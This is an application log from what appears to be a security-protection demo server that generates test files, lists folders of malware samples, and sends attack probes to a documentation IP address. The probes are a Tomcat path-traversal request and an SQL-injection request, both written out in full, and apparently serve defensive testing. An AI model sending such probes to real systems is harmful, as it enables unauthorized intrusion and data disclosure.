2025-01-08 13:58:45 - INFO - init_db:58 - Initializing protections database.
2025-01-08 13:58:45 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-01-08 13:58:45 - DEBUG - init_db:68 - Creating 'protections' table.
2025-01-08 13:58:45 - INFO - init_db:86 - 'protections' table created successfully.
2025-01-08 13:58:45 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-01-08 13:58:45 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-01-08 13:58:45 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-01-08 13:58:45 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-01-08 13:58:45 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-01-08 13:58:45 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-01-08 13:58:45 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-01-08 13:58:45 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-01-08 13:58:45 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-01-08 13:58:45 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-01-08 13:58:45 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-01-08 13:58:46 - INFO - init_db:58 - Initializing protections database.
2025-01-08 13:58:46 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-01-08 13:58:46 - DEBUG - init_db:68 - Creating 'protections' table.
2025-01-08 13:58:46 - INFO - init_db:86 - 'protections' table created successfully.
2025-01-08 13:58:46 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-01-08 13:58:46 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-01-08 13:58:46 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-01-08 13:58:46 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-01-08 13:58:46 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-01-08 13:58:46 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-01-08 13:58:46 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-01-08 13:58:46 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-01-08 13:58:46 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-01-08 13:58:46 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-01-08 13:58:46 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-01-08 13:59:31 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-08 13:59:31 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-08 13:59:31 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-08 13:59:35 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-08 13:59:35 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-08 13:59:35 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-08 13:59:39 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_6950.pdf
2025-01-08 13:59:39 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_6950.pdf' saved successfully.
2025-01-08 13:59:39 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-08 13:59:39 - INFO - generate:610 - File of type 'pdf' generated successfully.
2025-01-08 13:59:39 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-08 13:59:39 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-08 13:59:39 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-08 13:59:42 - INFO - send_email_route:826 - Email sent successfully to cpadmin@americas-ses.com.
2025-01-08 13:59:42 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-08 13:59:42 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-08 13:59:42 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-08 13:59:48 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_pdf_file_6950.pdf
2025-01-08 13:59:48 - INFO - delete_generated_file:564 - File 'generated_pdf_file_6950.pdf' deleted from database.
2025-01-08 13:59:48 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-08 13:59:48 - INFO - delete_generated_file:578 - File 'generated_pdf_file_6950.pdf' deleted from filesystem.
2025-01-08 13:59:48 - INFO - delete_file:482 - Deleted file: generated_pdf_file_6950.pdf
2025-01-08 13:59:48 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-08 13:59:48 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-08 13:59:48 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-08 14:01:14 - INFO - load_protections:334 - Loading all protections from the database.
2025-01-08 14:01:14 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-01-08 14:01:14 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-01-08 14:01:21 - INFO - dir_listing:419 - Resolved absolute path: /home/kali/Desktop/cp_demo_server/app/data/malware_samples
2025-01-08 14:01:21 - DEBUG - dir_listing:448 - Files and directories: [{'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}, {'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}]
2025-01-08 14:01:24 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-08 14:01:24 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-08 14:01:24 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-08 14:43:00 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-08 14:43:00 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-08 14:43:00 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-08 14:53:17 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-08 14:53:17 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-08 14:53:17 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-08 14:53:44 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-08 14:53:44 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-08 14:53:44 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-08 14:53:55 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_pdf_file_8230.pdf
2025-01-08 14:53:55 - INFO - save_generated_file_to_db:455 - Generated file 'generated_pdf_file_8230.pdf' saved successfully.
2025-01-08 14:53:55 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-08 14:53:55 - INFO - generate:610 - File of type 'pdf' generated successfully.
2025-01-08 14:53:55 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-08 14:53:55 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-08 14:53:55 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-08 14:53:57 - INFO - download_file:650 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_pdf_file_8230.pdf with MIME type: application/pdf
2025-01-08 14:54:14 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_pdf_file_8230.pdf
2025-01-08 14:54:14 - INFO - delete_generated_file:564 - File 'generated_pdf_file_8230.pdf' deleted from database.
2025-01-08 14:54:14 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-08 14:54:14 - INFO - delete_generated_file:578 - File 'generated_pdf_file_8230.pdf' deleted from filesystem.
2025-01-08 14:54:14 - INFO - delete_file:482 - Deleted file: generated_pdf_file_8230.pdf
2025-01-08 14:54:14 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-08 14:54:14 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-08 14:54:14 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-10 13:03:07 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-10 13:03:07 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-10 13:03:07 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-10 13:03:13 - INFO - load_protections:334 - Loading all protections from the database.
2025-01-10 13:03:13 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-01-10 13:03:13 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-01-10 13:03:14 - INFO - load_protections:334 - Loading all protections from the database.
2025-01-10 13:03:14 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-01-10 13:03:14 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-01-10 13:03:16 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-10 13:03:16 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-10 13:03:16 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-15 15:27:44 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-15 15:27:44 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-15 15:27:44 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-15 15:27:46 - INFO - load_protections:334 - Loading all protections from the database.
2025-01-15 15:27:46 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-01-15 15:27:46 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-01-15 15:27:49 - INFO - load_protections:334 - Loading all protections from the database.
2025-01-15 15:27:49 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-01-15 15:27:49 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-01-15 15:28:07 - INFO - get_protection_by_name:371 - Fetching protection by name: Apache Tomcat Server Malicious Request Information Disclosure
2025-01-15 15:28:07 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Apache Tomcat Server Malicious Request Information Disclosure', 'CVE-2002-2006,CVE-2002-2007,CVE-2002-2008', 'GET', 'http://{{IP}}/examples/jsp/source.jsp?../../../../system/autoexec.ncf', 'http', 'High', 'Medium', 'Medium', '')
2025-01-15 15:28:07 - INFO - get_protection_by_name:399 - Protection 'Apache Tomcat Server Malicious Request Information Disclosure' retrieved successfully.
2025-01-15 15:28:07 - DEBUG - send_request:84 - Sending GET request to http://203.0.113.250/examples/jsp/source.jsp?../../../../system/autoexec.ncf with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-01-15 15:28:07 - INFO - send_request:91 - GET response from http://203.0.113.250/examples/jsp/source.jsp?../../../../system/autoexec.ncf: 404
2025-01-15 15:28:07 - INFO - load_protections:334 - Loading all protections from the database.
2025-01-15 15:28:07 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-01-15 15:28:07 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-01-15 15:28:17 - INFO - get_protection_by_name:371 - Fetching protection by name: Flexible Poll SQL Injection (CVE-2018-5988)
2025-01-15 15:28:17 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Flexible Poll SQL Injection (CVE-2018-5988)', 'CVE-2018-5988', 'GET', "http://{{IP}}/cgi-bin/index.php?id='", 'http', 'Medium', 'Critical', 'Medium', '')
2025-01-15 15:28:17 - INFO - get_protection_by_name:399 - Protection 'Flexible Poll SQL Injection (CVE-2018-5988)' retrieved successfully.
2025-01-15 15:28:17 - DEBUG - send_request:84 - Sending GET request to http://203.0.113.250/cgi-bin/index.php?id=' with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-01-15 15:28:17 - INFO - send_request:91 - GET response from http://203.0.113.250/cgi-bin/index.php?id=': 404
2025-01-15 15:28:17 - INFO - load_protections:334 - Loading all protections from the database.
2025-01-15 15:28:17 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-01-15 15:28:17 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-01-15 15:28:24 - INFO - load_protections:334 - Loading all protections from the database.
2025-01-15 15:28:24 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-01-15 15:28:24 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-01-15 15:30:26 - INFO - load_protections:334 - Loading all protections from the database.
2025-01-15 15:30:26 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-01-15 15:30:26 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-01-15 15:30:30 - INFO - load_protections:334 - Loading all protections from the database.
2025-01-15 15:30:30 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-01-15 15:30:30 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-01-15 15:30:35 - INFO - load_protections:334 - Loading all protections from the database.
2025-01-15 15:30:35 - DEBUG - load_protections:346 - Fetched 41 records from 'protections' table.
2025-01-15 15:30:35 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-01-16 11:19:49 - INFO - init_db:58 - Initializing protections database.
2025-01-16 11:19:49 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-01-16 11:19:49 - DEBUG - init_db:68 - Creating 'protections' table.
2025-01-16 11:19:49 - INFO - init_db:86 - 'protections' table created successfully.
2025-01-16 11:19:49 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-01-16 11:19:49 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-01-16 11:19:49 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-01-16 11:19:49 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-01-16 11:19:49 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-01-16 11:19:49 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-01-16 11:19:49 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-01-16 11:19:49 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-01-16 11:19:49 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-01-16 11:19:49 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-01-16 11:19:49 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-01-16 11:20:23 - INFO - init_db:58 - Initializing protections database.
2025-01-16 11:20:23 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-01-16 11:20:23 - DEBUG - init_db:68 - Creating 'protections' table.
2025-01-16 11:20:23 - INFO - init_db:86 - 'protections' table created successfully.
2025-01-16 11:20:23 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-01-16 11:20:23 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-01-16 11:20:23 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-01-16 11:20:23 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-01-16 11:20:23 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-01-16 11:20:23 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-01-16 11:20:23 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-01-16 11:20:23 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-01-16 11:20:23 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-01-16 11:20:23 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-01-16 11:20:23 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-01-16 11:20:25 - INFO - init_db:58 - Initializing protections database.
2025-01-16 11:20:25 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-01-16 11:20:25 - DEBUG - init_db:68 - Creating 'protections' table.
2025-01-16 11:20:25 - INFO - init_db:86 - 'protections' table created successfully.
2025-01-16 11:20:25 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-01-16 11:20:25 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-01-16 11:20:25 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-01-16 11:20:25 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-01-16 11:20:25 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-01-16 11:20:25 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-01-16 11:20:25 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-01-16 11:20:25 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-01-16 11:20:25 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-01-16 11:20:25 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-01-16 11:20:25 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-01-16 11:20:54 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 11:20:54 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-16 11:20:54 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 11:21:00 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_exe_64bit_file_6899.exe
2025-01-16 11:21:00 - INFO - save_generated_file_to_db:455 - Generated file 'generated_exe_64bit_file_6899.exe' saved successfully.
2025-01-16 11:21:00 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-16 11:21:00 - INFO - generate:425 - File of type 'exe-64bit' generated successfully.
2025-01-16 11:21:00 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 11:21:00 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-16 11:21:00 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 11:21:06 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_exe_64bit_file_6899.exe
2025-01-16 11:21:06 - INFO - delete_generated_file:564 - File 'generated_exe_64bit_file_6899.exe' deleted from database.
2025-01-16 11:21:06 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-16 11:21:06 - INFO - delete_generated_file:578 - File 'generated_exe_64bit_file_6899.exe' deleted from filesystem.
2025-01-16 11:21:06 - INFO - delete_file:297 - Deleted file: generated_exe_64bit_file_6899.exe
2025-01-16 11:21:06 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 11:21:06 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-16 11:21:06 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 11:21:14 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_exe_32bit_file_1950.exe
2025-01-16 11:21:14 - INFO - save_generated_file_to_db:455 - Generated file 'generated_exe_32bit_file_1950.exe' saved successfully.
2025-01-16 11:21:14 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-16 11:21:14 - INFO - generate:425 - File of type 'exe' generated successfully.
2025-01-16 11:21:14 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 11:21:14 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-16 11:21:14 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 11:21:18 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_exe_32bit_file_1950.exe
2025-01-16 11:21:18 - INFO - delete_generated_file:564 - File 'generated_exe_32bit_file_1950.exe' deleted from database.
2025-01-16 11:21:18 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-16 11:21:18 - INFO - delete_generated_file:578 - File 'generated_exe_32bit_file_1950.exe' deleted from filesystem.
2025-01-16 11:21:18 - INFO - delete_file:297 - Deleted file: generated_exe_32bit_file_1950.exe
2025-01-16 11:21:18 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 11:21:18 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-16 11:21:18 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 21:38:34 - INFO - init_db:58 - Initializing protections database.
2025-01-16 21:38:34 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-01-16 21:38:34 - DEBUG - init_db:68 - Creating 'protections' table.
2025-01-16 21:38:34 - INFO - init_db:86 - 'protections' table created successfully.
2025-01-16 21:38:34 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-01-16 21:38:34 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-01-16 21:38:34 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-01-16 21:38:34 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-01-16 21:38:34 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-01-16 21:38:34 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-01-16 21:38:34 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-01-16 21:38:34 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-01-16 21:38:34 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-01-16 21:38:34 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-01-16 21:38:34 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-01-16 21:38:59 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 21:38:59 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-16 21:38:59 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 21:39:05 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_exe_32bit_file_1822.exe
2025-01-16 21:39:05 - INFO - save_generated_file_to_db:455 - Generated file 'generated_exe_32bit_file_1822.exe' saved successfully.
2025-01-16 21:39:05 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-16 21:39:05 - INFO - generate:425 - File of type 'exe' generated successfully.
2025-01-16 21:39:05 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 21:39:05 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-16 21:39:05 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 21:39:10 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_exe_32bit_file_1822.exe with MIME type: application/x-msdownload
2025-01-16 21:39:48 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_exe_32bit_file_1822.exe
2025-01-16 21:39:48 - INFO - delete_generated_file:564 - File 'generated_exe_32bit_file_1822.exe' deleted from database.
2025-01-16 21:39:48 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-16 21:39:48 - INFO - delete_generated_file:578 - File 'generated_exe_32bit_file_1822.exe' deleted from filesystem.
2025-01-16 21:39:48 - INFO - delete_file:297 - Deleted file: generated_exe_32bit_file_1822.exe
2025-01-16 21:39:48 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 21:39:48 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-16 21:39:48 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 21:40:29 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 21:40:29 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-16 21:40:29 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 21:40:34 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_exe_32bit_file_8047.exe
2025-01-16 21:40:34 - INFO - save_generated_file_to_db:455 - Generated file 'generated_exe_32bit_file_8047.exe' saved successfully.
2025-01-16 21:40:34 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-16 21:40:34 - INFO - generate:425 - File of type 'exe' generated successfully.
2025-01-16 21:40:34 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 21:40:34 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-16 21:40:34 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 21:40:35 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_exe_32bit_file_8047.exe with MIME type: application/x-msdownload
2025-01-16 21:45:24 - INFO - delete_generated_file:557 - Attempting to delete generated file: generated_exe_32bit_file_8047.exe
2025-01-16 21:45:24 - INFO - delete_generated_file:564 - File 'generated_exe_32bit_file_8047.exe' deleted from database.
2025-01-16 21:45:24 - DEBUG - delete_generated_file:571 - Database connection closed after delete_generated_file.
2025-01-16 21:45:24 - INFO - delete_generated_file:578 - File 'generated_exe_32bit_file_8047.exe' deleted from filesystem.
2025-01-16 21:45:24 - INFO - delete_file:297 - Deleted file: generated_exe_32bit_file_8047.exe
2025-01-16 21:45:24 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 21:45:24 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-16 21:45:24 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 21:45:28 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_exe_32bit_file_3019.exe
2025-01-16 21:45:28 - INFO - save_generated_file_to_db:455 - Generated file 'generated_exe_32bit_file_3019.exe' saved successfully.
2025-01-16 21:45:28 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-16 21:45:28 - INFO - generate:425 - File of type 'exe' generated successfully.
2025-01-16 21:45:28 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 21:45:28 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-16 21:45:28 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 21:45:29 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_exe_32bit_file_3019.exe with MIME type: application/x-msdownload
2025-01-16 21:45:42 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-16 21:45:42 - INFO - delete_all_generated_files:597 - All files deleted from database.
2025-01-16 21:45:42 - DEBUG - delete_all_generated_files:604 - Database connection closed after delete_all_generated_files.
2025-01-16 21:45:42 - INFO - delete_all_generated_files:613 - File 'generated_exe_32bit_file_3019.exe' deleted from filesystem.
2025-01-16 21:45:42 - INFO - delete_all_generated_files:613 - File 'generated_pdf_file_1505.pdf' deleted from filesystem.
2025-01-16 21:45:42 - INFO - delete_all_files:327 - Deleted all generated files.
2025-01-16 21:45:42 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 21:45:42 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-16 21:45:42 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 21:46:07 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 21:46:07 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-01-16 21:46:07 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 21:46:12 - INFO - save_generated_file_to_db:438 - Saving generated file to database: generated_exe_32bit_file_1096.exe
2025-01-16 21:46:12 - INFO - save_generated_file_to_db:455 - Generated file 'generated_exe_32bit_file_1096.exe' saved successfully.
2025-01-16 21:46:12 - DEBUG - save_generated_file_to_db:462 - Database connection closed after save_generated_file_to_db.
2025-01-16 21:46:12 - INFO - generate:425 - File of type 'exe' generated successfully.
2025-01-16 21:46:12 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-01-16 21:46:12 - DEBUG - load_generated_files:499 - Fetched 1 records from 'generated_files' table.
2025-01-16 21:46:12 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-01-16 21:46:14 - INFO - download_file:465 - Serving file for download: /home/kali/Desktop/cp_demo_server/app/data/generated_files/generated_exe_32bit_file_1096.exe with MIME type: application/x-msdownload
2025-01-16 21:50:24 - INFO - delete_all_generated_files:590 - Attempting to delete all generated files.
2025-01-16 21:50:24 - INFO - delete_all_generated_files:597 - All files deleted from database.
